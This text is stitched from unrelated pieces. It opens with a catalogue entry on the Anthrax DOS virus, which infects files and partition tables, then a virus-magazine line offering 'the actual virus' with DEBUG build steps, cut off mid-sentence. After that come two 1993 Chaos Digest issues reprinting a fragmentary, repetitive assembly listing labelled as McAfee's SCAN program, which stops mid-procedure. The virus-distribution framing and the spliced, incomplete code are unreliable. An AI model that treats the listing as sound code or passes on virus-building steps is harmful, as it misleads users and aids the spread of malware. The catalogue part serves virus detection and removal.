
 Aliases:
 V Status:    Rare [Not for long]
 Discovery:   July, 1990
 Symptoms:    .COM & .EXE growth
 Origin:      Bulgaria
 Isolated:    Netherlands
 Eff Length:  1040 - 1279 Bytes
 Type Code:   PRAKX-Parasitic Resident .COM, .EXE, & Partition Table Infector
 Detection Method:  ViruScan V66+, Pro-Scan 2.01+, IBM Scan 2.00+
 Removal Instructions: Scan/D + MDisk/P, Pro-Scan 2.01+
 General Comments:

The Anthrax Virus was isolated in July 1990 in the Netherlands after
it was uploaded onto several BBSes in a trojan anti-viral program,
USCAN.ZIP.  It is the second virus to be found in a copy of UScan
during July 1990, the first virus being V2100.  Anthrax is a memory
resident generic infector of .COM and .EXE files, including
COMMAND.COM.

The first time a program infected with the Anthrax virus is executed
on the system's hard disk, the virus will infect the hard disk's
partition table.  At this point, the virus is not memory resident.  It
will also write a copy of itself on the last few sectors of the
system's hard disk.  If data existed on those last few sectors of the
hard disk, it will be destroyed.

When the system is booted from the hard disk, the Anthrax virus
will install itself memory resident.  It will remain memory resident
until the first program is executed.  At that time, it will deinstall
itself from being resident and infect one .COM or .EXE file.  This
virus does not infect files in the current directory first, but
instead starts to infect files at the lowest level of the disk's
directory tree.

Later, when an infected program is executed, Anthrax will infect one
.COM or .EXE file, searching the directory structure from the lowest
level of the directory tree.  If the executed infected program
was located on the floppy drive, a .COM or .EXE file may or may not
be infected.

The Anthrax Virus's code is 1,024 bytes long, but infected programs
will increase in length by 1,040 to 1,279 bytes.  On the author's test
system, the largest increase in length experienced was 1,232 bytes.
Infected files will always have an infected file length that is a
multiple of 16.

The following text strings can be found in files infected with the
Anthrax virus:

        "(c)Damage, Inc."
        "ANTHRAX"

A third text string occurs in the viral code, but it is in Cyrillics.
Per Vesselin Bontchev, this third string translates to: "Sofia 1990".

Since Anthrax infects the hard disk partition tables, infected systems
must have the partition table disinfected or rebuilt in order to
remove the virus.  This disinfection can be done with either a low-
level format or use of the MDisk/P program for the correct DOS
version after powering off and rebooting from a write-protected boot
diskette for the system.  Any .COM or .EXE files infected with
Anthrax must also be disinfected or erased.  Since a copy of the virus
will exist on the last few sectors of the drive, these must also be
located and overwritten.

Anthrax interacts with another virus: V2100.  If a system which was
previously infected with Anthrax should become infected with the V2100
virus, the V2100 virus will check the last few sectors of the hard
disk for the spare copy of Anthrax.  If the spare copy is found, then
Anthrax will be copied to the hard disk's partition table.

It is not known if Anthrax carries any destructive capabilities or
trigger/activation dates.

Here is the actual virus.  Well if this is your fist copy of
40Hex, let me explain how to compile it.

First copy what is below with your editor.  Then save it to a file
called ANTHRAX.SCR.  Then type at the command line -

DEBUG 

Chaos Digest              Jeudi 27 Mai 1993        Volume 1 : Numero 38
                           ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.38 (27 Mai 1993)
File 1--40H VMag Issue 1 Volume 3 #004(2) (reprint)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Issue 1 Volume 3 #004(2) (reprint)

[suite du listing du SCAN de John McAfee]

sub_4:
                mov     bx,ax
                mov     cl,4
                shr     bx,cl
                call    sub_5
                mov     bx,ax

sub_5:
                and     bx,0Fh
                mov     dl,data_19[bx]

sub_6:
loc_15:
                push    ax
                mov     ah,2
                int     21h
                pop     ax
                retn

sub_7:
                mov     dl,2Dh
                jmp     short loc_15

sub_8:
                mov     dl,0Dh
                call    sub_6
                mov     dl,0Ah
                jmp     short loc_15
loc_16:
                mov     dx,624h
                mov     cx,29h
loc_17:
                mov     bx,2
                push    ax
                mov     ah,40h
                int     21h
                jc      loc_18
                pop     ax
loc_18:
                mov     ah,4Ch
                int     21h
sub_3           endp

sub_9           proc    near
                xor     bx,bx
                xor     cx,cx
                inc     si
                lodsb
loc_19:
                mov     cl,al
                mov     ax,1
                shl     ax,cl
                or      bx,ax
                lodsb
                cmp     al,0C8h
                jb      loc_19
                mov     cl,8
                mov     di,656h
                mov     ax,bx
loc_20:
                stosw
                shr     ax,1
                jnc     loc_21
                xor     ax,bx
loc_21:
                dec     cl
                jnz     loc_20
                retn
sub_9           endp

sub_10          proc    near
                mov     si,656h
                xor     dx,dx
loc_22:
                mov     cx,dx
                mov     bx,si
                xor     ax,ax
loc_23:
                shl     cl,1
                jnc     loc_24
                xor     ax,[bx]
loc_24:
                add     bx,2
                or      cl,cl
                jnz     loc_23
                stosw
                inc     dl
                jnz     loc_22
                retn
sub_10          endp

sub_11          proc    near
loc_25:
                lodsb
                mov     bl,cl
                xor     bl,al
                xor     bh,bh
                mov     cl,ch
                mov     ch,0
                add     bx,bx
                xor     cx,[bx+di]
                dec     dx
                jnz     loc_25
                retn
sub_11          endp

data_27         dw      4240h
data_28         dw      0Fh
data_29         dw      3E8h
data_30         dw      0Ah

sub_12          proc    near
                cmp     dx,data_28
                jb      loc_32
                ja      loc_26
                cmp     ax,data_27
                jb      loc_32
loc_26:
                mov     bx,data_27
                mov     cx,data_28
                xor     si,si
loc_27:
                inc     si
                shl     bx,1
                rcl     cx,1
                jno     loc_27
                xor     di,di
loc_28:
                shl     di,1
                cmp     dx,cx
                jb      loc_30
                ja      loc_29
                cmp     ax,bx
                jb      loc_30
loc_29:
                sub     ax,bx
                sbb     dx,cx
                inc     di
loc_30:
                shr     cx,1
                rcr     bx,1
                dec     si
                jge     loc_28
                push    dx
                push    ax
                mov     ax,di
                xor     dx,dx
                call    sub_14
                mov     al,2Ch
                call    sub_19
                pop     ax
                pop     dx
                div     data_29
                push    dx
                call    sub_15
                jmp     short loc_33

sub_13:
                xor     dx,dx
                cmp     ax,2710h
                jae     loc_32
                cmp     ax,3E8h
                jb      loc_32
                div     data_29
                or      ax,ax
                push    dx
                jz      loc_31
                call    sub_16
loc_31:
                pop     ax
                jmp     short loc_34

sub_14:
loc_32:
                div     data_29
                push    dx
                or      ax,ax
                jz      loc_31
                call    sub_16
loc_33:
                mov     al,2Ch
                call    sub_19
                pop     ax

sub_15:
                xor     dx,dx
                div     data_30
                jmp     loc_35
                db      88h, 0E0h, 32h, 0E4h

sub_16:
loc_34:
                cmp     ax,0Ah
                jb      loc_37
                xor     dx,dx
                div     data_30
                cmp     al,0Ah
                jb      loc_36
loc_35:
                push    dx
                xor     dx,dx
                div     data_30
                call    sub_17
                pop     ax
                jmp     loc_37

sub_17:
loc_36:
                push    dx
                call    sub_18
                pop     ax

sub_18:
loc_37:
                add     al,30h

sub_19:
                mov     ah,2
                mov     dl,al
                int     21h
                retn
sub_12          endp

                db      0Dh, 0Ah, ' Sorry, I cannot open '
                db      'the input file.', 0Dh, 0Ah, 0Dh, 0Ah
                db      ' Sorry, I cannot read the input '
                db      'file.', 0Dh, 0Ah
                db      90h
data_32         dw      0
data_33         dw      0
data_34         dw      0
data_35         dw      0
                db      0ACh, 29h, 0ADh, 29h, 0AEh, 29h
                db      0AFh, 29h, 0B0h, 29h, 0E9h, 70h
                db      2, 0E9h, 49h, 2
                db      14 dup (0)
                db      0E9h, 0C7h, 0, 0Dh, 0, 0
                db      0
                db      44h, 29h
                db      42 dup (0)
                db      0CCh, 7, 6, 7
                db      13 dup (0)
                db      3, 2, 0CFh, 0C8h, 0Dh, 0C9h
                db      0Dh
                db      79 dup (0)
                db      0Dh, 0Ah, 'Please enter the passw'
                db      'ord now: '
                db      0
                db      0Dh, 0Ah, 'This program requires '
                db      'DOS 3.00 or greater'
                db      7, 0Dh, 0Ah, 0, 5Ch, 2Ah
                db      2Eh, 2Ah, 0
                db      0Dh, 0Ah, '%%211#---4677^^^%'
                db      7, 0Dh, 0Ah, 0, 42h, 23h
                db      0
                db      305 dup (0)
                db      50h, 53h, 0A1h, 1, 1, 5
                db      3, 1, 0D1h, 0E8h, 0D1h, 0E8h
                db      0D1h, 0E8h, 0D1h, 0E8h, 8Bh, 0D8h
                db      8Ch, 0C8h, 3, 0C3h, 50h, 0B8h
                db      6Bh, 2, 50h, 0CBh, 5Bh, 58h
                db      2Eh, 0C6h, 6, 1Ah, 0, 0FFh
                db      2Eh, 8Ch, 6, 1Bh, 1, 2Eh
                db      0A3h, 1Dh, 1, 2Eh, 89h, 26h
                db      1Fh, 1, 2Eh, 8Ch, 16h, 21h
                db      1, 8Ch, 0C8h, 8Eh, 0D0h, 0BCh
                db      4Fh, 2, 2Eh, 0A1h, 1Dh, 1
                db      50h, 53h, 51h, 52h, 56h, 57h
                db      55h, 1Eh, 6, 8Ch, 0C8h, 8Eh
                db      0D8h, 8Eh, 0C0h, 0A0h, 1Bh, 0
                db      3Ch, 50h, 75h, 6, 0E8h, 6Ah
                db      0, 0EBh, 15h, 90h, 3Ch, 44h
                db      75h, 6, 0E8h, 78h, 0, 0EBh
                db      0Bh, 90h
loc_38:
                cmp     al,4Ch
                jne     loc_39
                call    sub_21
                jmp     short loc_40
loc_39:
                stc
loc_40:
                pop     es
                pop     ds
                pop     bp
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                cmp     byte ptr cs:data_7e,0
                je      loc_41
                mov     ax,cs:data_4e
                mov     ds:data_1e,ax
                mov     ax,cs:data_5e
                mov     ds:data_2e,ax
                mov     ax,100h
                mov     cs:data_4e,ax
                mov     cs:data_5e,ds
                jmp     short loc_42
loc_41:
                mov     ax,cs
                sub     ax,cs:data_6e
                add     cs:data_5e,ax
loc_42:
                pop     ax
                mov     ss,word ptr cs:[121h]
                mov     sp,word ptr cs:[11Fh]
                jmp     dword ptr cs:data_4e
                db      0BAh, 4, 1, 0E8h, 0BCh, 0
                db      0B8h, 0FFh, 4Ch, 0CDh, 21h, 0BAh
                db      0AEh, 0, 0E8h, 0B1h, 0, 0C6h
                db      6, 58h, 0, 29h, 0BAh, 58h
                db      0, 0E8h, 74h, 0, 0E8h, 0BDh
                db      0, 0E8h, 87h, 0, 0C3h

sub_20          proc    near
                mov     ah,2Ah
                int     21h
                cmp     cx,ds:data_8e
                jb      loc_44
                cmp     dh,ds:data_9e
                jb      loc_44
                cmp     dl,ds:data_10e
                jb      loc_44
                jmp     short loc_44
                db      90h, 0B4h, 30h, 0CDh, 21h, 3Ch
                db      3, 73h, 4, 0F8h, 0EBh, 25h
                db      90h, 1Eh, 6, 32h, 0C0h, 0B9h
                db      0, 80h, 2Eh, 8Eh, 6, 1Bh
                db      1, 26h, 8Eh, 6, 2Ch, 0
                db      33h, 0FFh
loc_43:
                repne   scasb
                scasb
                jnz     loc_43
                add     di,2
                push    es
                pop     ds
                mov     dx,di
                mov     ah,41h
                clc
                pop     es
                pop     ds
loc_44:
                cmc
                retn
sub_20          endp

sub_21          proc    near
                mov     ah,1Ah
                mov     dx,83h
                int     21h
                mov     ah,4Eh
                mov     cx,8
                mov     dx,0FFh
                int     21h
                mov     si,0A1h
                mov     di,4Bh
                cld
loc_45:
                lodsb
                scasb
                stc
                jnz     loc_ret_46
                or      al,al
                jnz     loc_45

loc_ret_46:
                retn
sub_21          endp

sub_22          proc    near
                push    ax
                push    bx
                push    cx
                mov     ah,0Ah
                int     21h
                mov     bx,dx
                inc     bx
                mov     cl,[bx]
                xor     ch,ch
                jcxz    loc_48

locloop_47:
                inc     bx
                not     byte ptr [bx]
                loop    locloop_47

loc_48:
                pop     cx
                pop     bx
                pop     ax
                retn
sub_22          endp

sub_23          proc    near
                push    cx
                push    si
                push    di
                mov     cl,ds:data_11e
                xor     ch,ch
                mov     si,59h
                mov     di,1Dh
                cld
                repe    cmpsb
                jz      loc_49
                stc
loc_49:
                pop     di
                pop     si
                pop     cx
                retn
sub_23          endp

sub_24          proc    near
                push    bx
                push    dx
                mov     bx,dx
loc_50:
                mov     dl,[bx]
                or      dl,dl
                jz      loc_51
                call    sub_25
                inc     bx
                jmp     short loc_50
loc_51:
                pop     dx
                pop     bx
                retn
sub_24          endp

sub_25          proc    near
                push    ax
                mov     ah,2
                int     21h
                pop     ax
                retn
sub_25          endp

sub_26          proc    near
                push    dx
                mov     dl,0Dh
                call    sub_25
                mov     dl,0Ah
                call    sub_25
                pop     dx
                retn
sub_26          endp

                db      0, 0, 0, 0, 0ACh, 29h
                db      0ADh, 29h, 0AEh, 29h, 0AFh, 29h
                db      0B0h, 29h, 0E9h, 70h, 2, 0E9h
                db      49h, 2
                db      14 dup (0)
                db      0E9h, 60h, 5, 0Dh, 0, 0
                db      0
                db      44h, 29h
                db      42 dup (0)
                db      0EAh, 7, 0Ch, 1Fh, 0
                db      12 dup (0)
                db      3, 2, 0CCh, 0CEh, 0Dh, 0C9h
                db      0Dh
                db      79 dup (0)
                db      0Dh, 0Ah, 'Please enter the passw'
                db      'ord now: '
                db      0
                db      0Dh, 0Ah, 'This program requires '
                db      'DOS 3.00 or greater'
                db      7, 0Dh, 0Ah, 0, 5Ch, 2Ah
                db      2Eh, 2Ah, 0
                db      0Dh, 0Ah, '%%211#---4677^^^%'
                db      7, 0Dh, 0Ah, 0, 42h, 23h
                db      0
                db      305 dup (0)
                db      50h, 53h, 0A1h, 1, 1, 5
                db      3, 1, 0D1h, 0E8h, 0D1h, 0E8h
                db      0D1h, 0E8h, 0D1h, 0E8h, 8Bh, 0D8h
                db      8Ch, 0C8h, 3, 0C3h, 50h, 0B8h
                db      6Bh, 2, 50h, 0CBh, 5Bh, 58h
                db      2Eh, 0C6h, 6, 1Ah, 0, 0FFh
                db      2Eh, 8Ch, 6, 1Bh, 1, 2Eh
                db      0A3h, 1Dh, 1, 2Eh, 89h, 26h
                db      1Fh, 1, 2Eh, 8Ch, 16h, 21h
                db      1, 8Ch, 0C8h, 8Eh, 0D0h, 0BCh
                db      4Fh, 2, 2Eh, 0A1h, 1Dh, 1
                db      50h, 53h, 51h, 52h, 56h, 57h
                db      55h, 1Eh, 6, 8Ch, 0C8h, 8Eh
                db      0D8h, 8Eh, 0C0h, 0A0h, 1Bh, 0
                db      3Ch, 50h, 75h, 6, 0E8h, 6Ah
                db      0, 0EBh, 15h, 90h, 3Ch, 44h
                db      75h, 6, 0E8h, 78h, 0, 0EBh
                db      0Bh, 90h
loc_52:
                cmp     al,4Ch
                jne     loc_53
                call    sub_28
                jmp     short loc_54
loc_53:
                stc
loc_54:
                pop     es
                pop     ds
                pop     bp
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                cmp     byte ptr cs:data_7e,0
                je      loc_55
                mov     ax,cs:data_4e
                mov     ds:data_1e,ax
                mov     ax,cs:data_5e
                mov     ds:data_2e,ax
                mov     ax,100h
                mov     cs:data_4e,ax
                mov     cs:data_5e,ds
                jmp     short loc_56
loc_55:
                mov     ax,cs
                sub     ax,cs:data_6e
                add     cs:data_5e,ax
loc_56:
                pop     ax
                mov     ss,word ptr cs:[121h]
                mov     sp,word ptr cs:[11Fh]
                jmp     dword ptr cs:data_4e
                db      0BAh, 4, 1, 0E8h, 0BCh, 0
                db      0B8h, 0FFh, 4Ch, 0CDh, 21h, 0BAh
                db      0AEh, 0, 0E8h, 0B1h, 0, 0C6h
                db      6, 58h, 0, 29h, 0BAh, 58h
                db      0, 0E8h, 74h, 0, 0E8h, 0BDh
                db      0, 0E8h, 87h, 0, 0C3h

sub_27          proc    near
                mov     ah,2Ah
                int     21h
                cmp     cx,ds:data_8e
                jb      loc_58
                cmp     dh,ds:data_9e
                jb      loc_58
                cmp     dl,ds:data_10e
                jb      loc_58
                jmp     short loc_58
                db      90h, 0B4h, 30h, 0CDh, 21h, 3Ch
                db      3, 73h, 4, 0F8h, 0EBh, 25h
                db      90h, 1Eh, 6, 32h, 0C0h, 0B9h
                db      0, 80h, 2Eh, 8Eh, 6, 1Bh
                db      1, 26h, 8Eh, 6, 2Ch, 0
                db      33h, 0FFh
loc_57:
                repne   scasb
                scasb
                jnz     loc_57
                add     di,2
                push    es
                pop     ds
                mov     dx,di
                mov     ah,41h
                clc
                pop     es
                pop     ds
loc_58:
                cmc
                retn
sub_27          endp

sub_28          proc    near
                mov     ah,1Ah
                mov     dx,83h
                int     21h
                mov     ah,4Eh
                mov     cx,8
                mov     dx,0FFh
                int     21h
                mov     si,0A1h
                mov     di,4Bh
                cld
loc_59:
                lodsb
                scasb
                stc
                jnz     loc_ret_60
                or      al,al
                jnz     loc_59

loc_ret_60:
                retn
sub_28          endp

sub_29          proc    near
                push    ax
                push    bx
                push    cx
                mov     ah,0Ah
                int     21h
                mov     bx,dx
                inc     bx
                mov     cl,[bx]
                xor     ch,ch
                jcxz    loc_62

locloop_61:
                inc     bx
                not     byte ptr [bx]
                loop    locloop_61

loc_62:
                pop     cx
                pop     bx
                pop     ax
                retn
sub_29          endp

sub_30          proc    near
                push    cx
                push    si
                push    di
                mov     cl,ds:data_11e
                xor     ch,ch
                mov     si,59h
                mov     di,1Dh
                cld
                repe    cmpsb
                jz      loc_63
                stc
loc_63:
                pop     di
                pop     si
                pop     cx
                retn
sub_30          endp

sub_31          proc    near
                push    bx
                push    dx
                mov     bx,dx
loc_64:
                mov     dl,[bx]
                or      dl,dl
                jz      loc_65
                call    sub_32
                inc     bx
                jmp     short loc_64
loc_65:
                pop     dx
                pop     bx
                retn
sub_31          endp

sub_32          proc    near
                push    ax
                mov     ah,2
                int     21h
                pop     ax
                retn
sub_32          endp
sub_33          proc    near
                push    dx
                mov     dl,0Dh
                call    sub_32
                mov     dl,0Ah
                call    sub_32
                pop     dx
                retn
sub_33          endp

                db      0, 0, 0, 0, 0ACh, 29h
                db      0ADh, 29h, 0AEh, 29h, 0AFh, 29h
                db      0B0h, 29h, 0E9h, 70h, 2, 0E9h
                db      49h, 2
                db      14 dup (0)
                db      0E9h, 60h, 9, 0Dh, 0, 0
                db      0
                db      44h, 29h
                db      42 dup (0)
                db      0C2h, 7, 9, 0Bh, 0
                db      12 dup (0)
                db      3, 2, 0CEh, 0CEh, 0Dh, 0C9h
                db      0Dh
                db      79 dup (0)
                db      0Dh, 0Ah, 'Please enter the passw'
                db      'ord now: '
                db      0
                db      0Dh, 0Ah, 'This program requires '
                db      'DOS 3.00 or greater'
                db      7, 0Dh, 0Ah, 0, 5Ch, 2Ah
                db      2Eh, 2Ah, 0
                db      0Dh, 0Ah, '%%211#---4677^^^%'
                db      7, 0Dh, 0Ah, 0, 42h, 23h
                db      0
                db      305 dup (0)
                db      50h, 53h, 0A1h, 1, 1, 5
                db      3, 1, 0D1h, 0E8h, 0D1h, 0E8h
                db      0D1h, 0E8h, 0D1h, 0E8h, 8Bh, 0D8h
                db      8Ch, 0C8h, 3, 0C3h, 50h, 0B8h
                db      6Bh, 2, 50h, 0CBh, 5Bh, 58h
                db      2Eh, 0C6h, 6, 1Ah, 0, 0FFh
                db      2Eh, 8Ch, 6, 1Bh, 1, 2Eh
                db      0A3h, 1Dh, 1, 2Eh, 89h, 26h
                db      1Fh, 1, 2Eh, 8Ch, 16h, 21h
                db      1, 8Ch, 0C8h, 8Eh, 0D0h, 0BCh
                db      4Fh, 2, 2Eh, 0A1h, 1Dh, 1
                db      50h, 53h, 51h, 52h, 56h, 57h
                db      55h, 1Eh, 6, 8Ch, 0C8h, 8Eh
                db      0D8h, 8Eh, 0C0h, 0A0h, 1Bh, 0
                db      3Ch, 50h, 75h, 6, 0E8h, 6Ah
                db      0, 0EBh, 15h, 90h, 3Ch, 44h
                db      75h, 6, 0E8h, 78h, 0, 0EBh
                db      0Bh, 90h
loc_66:
                cmp     al,4Ch
                jne     loc_67
                call    sub_35
                jmp     short loc_68
loc_67:
                stc
loc_68:
                pop     es
                pop     ds
                pop     bp
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                cmp     byte ptr cs:data_7e,0
                je      loc_69
                mov     ax,cs:data_4e
                mov     ds:data_1e,ax
                mov     ax,cs:data_5e
                mov     ds:data_2e,ax
                mov     ax,100h
                mov     cs:data_4e,ax
                mov     cs:data_5e,ds
                jmp     short loc_70

loc_69:
                mov     ax,cs
                sub     ax,cs:data_6e
                add     cs:data_5e,ax
loc_70:
                pop     ax
                mov     ss,word ptr cs:[121h]
                mov     sp,word ptr cs:[11Fh]
                jmp     dword ptr cs:data_4e
                db      0BAh, 4, 1, 0E8h, 0BCh, 0
                db      0B8h, 0FFh, 4Ch, 0CDh, 21h, 0BAh
                db      0AEh, 0, 0E8h, 0B1h, 0, 0C6h
                db      6, 58h, 0, 29h, 0BAh, 58h
                db      0, 0E8h, 74h, 0, 0E8h, 0BDh
                db      0, 0E8h, 87h, 0, 0C3h

sub_34          proc    near
                mov     ah,2Ah
                int     21h
                cmp     cx,ds:data_8e
                jb      loc_72
                cmp     dh,ds:data_9e
                jb      loc_72
                cmp     dl,ds:data_10e
                jb      loc_72
                jmp     short loc_72
                db      90h, 0B4h, 30h, 0CDh, 21h, 3Ch
                db      3, 73h, 4, 0F8h, 0EBh, 25h
                db      90h, 1Eh, 6, 32h, 0C0h, 0B9h
                db      0, 80h, 2Eh, 8Eh, 6, 1Bh
                db      1, 26h, 8Eh, 6, 2Ch, 0
                db      33h, 0FFh
loc_71:
                repne   scasb
                scasb
                jnz     loc_71
                add     di,2
                push    es
                pop     ds
                mov     dx,di
                mov     ah,41h
                clc
                pop     es
                pop     ds
loc_72:
                cmc
                retn
sub_34          endp

sub_35          proc    near
                mov     ah,1Ah
                mov     dx,83h
                int     21h
                mov     ah,4Eh
                mov     cx,8
                mov     dx,0FFh
                int     21h
                mov     si,0A1h
                mov     di,4Bh
                cld
loc_73:
                lodsb
                scasb
                stc
                jnz     loc_ret_74
                or      al,al
                jnz     loc_73

loc_ret_74:
                retn
sub_35          endp

sub_36          proc    near
                push    ax
                push    bx
                push    cx
                mov     ah,0Ah
                int     21h
                mov     bx,dx
                inc     bx
                mov     cl,[bx]
                xor     ch,ch
                jcxz    loc_76

locloop_75:
                inc     bx
                not     byte ptr [bx]
                loop    locloop_75

loc_76:
                pop     cx
                pop     bx
                pop     ax
                retn
sub_36          endp

sub_37          proc    near
                push    cx
                push    si
                push    di
                mov     cl,ds:data_11e
                xor     ch,ch
                mov     si,59h
                mov     di,1Dh
                cld
                repe    cmpsb
                jz      loc_77
                stc
loc_77:
                pop     di
                pop     si
                pop     cx
                retn
sub_37          endp

sub_38          proc    near
                push    bx
                push    dx
                mov     bx,dx
loc_78:
                mov     dl,[bx]
                or      dl,dl
                jz      loc_79
                call    sub_39
                inc     bx
                jmp     short loc_78
loc_79:
                pop     dx
                pop     bx
                retn
sub_38          endp

------------------------------

End of Chaos Digest #1.38
************************************

Chaos Digest              Jeudi 27 Mai 1993        Volume 1 : Numero 39
                           ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.39 (27 Mai 1993)
File 1--40H VMag Issue 1 Volume 3 #004(3)-008(1) (reprint)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Issue 1 Volume 3 #004(3)-008(1) (reprint)

[suite du listing du SCAN de John McAfee]


sub_39          proc    near
                push    ax
                mov     ah,2
                int     21h
                pop     ax
                retn
sub_39          endp

sub_40          proc    near
                push    dx
                mov     dl,0Dh
                call    sub_39
                mov     dl,0Ah
                call    sub_39
                pop     dx
                retn
sub_40          endp

                db      0, 0, 0, 0, 0ACh, 29h
                db      0ADh, 29h, 0AEh, 29h, 0AFh, 29h
                db      0B0h, 29h, 0E9h, 6Ch, 2, 0E9h
                db      45h, 2, 0
                db      13 dup (0)
                db      0E9h, 60h, 0Dh, 0Dh, 0, 0
                db      0
                db      44h, 29h
                db      42 dup (0)
                db      0D2h, 7, 1, 1
                db      13 dup (0)
                db      3, 2, 0CFh, 0CEh, 0Dh, 0CDh
                db      0Dh
                db      79 dup (0)
                db      0Dh, 0Ah, 'Please enter the passw'
                db      'ord now: '
                db      0
                db      0Dh, 0Ah, 'This program requires '
                db      'DOS 3.00 or greater'
                db      7, 0Dh, 0Ah, 0, 5Ch, 2Ah
                db      2Eh, 2Ah, 0
                db      0Dh, 0Ah, 'Access denied'
                db      7, 0Dh, 0Ah, 0, 42h, 23h
                db      0
                db      305 dup (0)
                db      50h, 53h, 0A1h, 1, 1, 5
                db      3, 1, 0D1h, 0E8h, 0D1h, 0E8h
                db      0D1h, 0E8h, 0D1h, 0E8h, 8Bh, 0D8h
                db      8Ch, 0C8h, 3, 0C3h, 50h, 0B8h
                db      67h, 2, 50h, 0CBh, 5Bh, 58h
                db      2Eh, 0C6h, 6, 1Ah, 0, 0FFh
                db      2Eh, 8Ch, 6, 17h, 1, 2Eh
                db      0A3h, 19h, 1, 2Eh, 89h, 26h
                db      1Bh, 1, 2Eh, 8Ch, 16h, 1Dh
                db      1, 8Ch, 0C8h, 8Eh, 0D0h, 0BCh
                db      4Bh, 2, 2Eh, 0A1h, 19h, 1
                db      50h, 53h, 51h, 52h, 56h, 57h
                db      55h, 1Eh, 6, 8Ch, 0C8h, 8Eh
                db      0D8h, 8Eh, 0C0h, 0A0h, 1Bh, 0
                db      3Ch, 50h, 75h, 6, 0E8h, 6Ch
                db      0, 0EBh, 15h, 90h, 3Ch, 44h
                db      75h, 6, 0E8h, 7Ah, 0, 0EBh
                db      0Bh, 90h
loc_80:
                cmp     al,4Ch
                jne     loc_81
                call    sub_42
                jmp     short loc_82
loc_81:
                stc
loc_82:
                jc      loc_85
                pop     es
                pop     ds
                pop     bp
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                cmp     byte ptr cs:data_7e,0
                je      loc_83
                mov     ax,cs:data_4e
                mov     ds:data_1e,ax
                mov     ax,cs:data_5e
                mov     ds:data_2e,ax
                mov     ax,100h
                mov     cs:data_4e,ax
                mov     cs:data_5e,ds
                jmp     short loc_84
loc_83:
                mov     ax,cs
                sub     ax,cs:data_6e
                add     cs:data_5e,ax
loc_84:
                pop     ax
                mov     ss,word ptr cs:[11Dh]
                mov     sp,word ptr cs:[11Bh]
                jmp     dword ptr cs:data_4e
loc_85:
                mov     dx,104h
                call    sub_45
                mov     ax,4CFFh
                int     21h
                db      0BAh, 0AEh, 0, 0E8h, 0B6h, 0
                db      0C6h, 6, 58h, 0, 29h, 0BAh
                db      58h, 0, 0E8h, 79h, 0, 0E8h
                db      0C2h, 0, 0E8h, 8Ch, 0, 0C3h

sub_41          proc    near
                mov     ah,2Ah
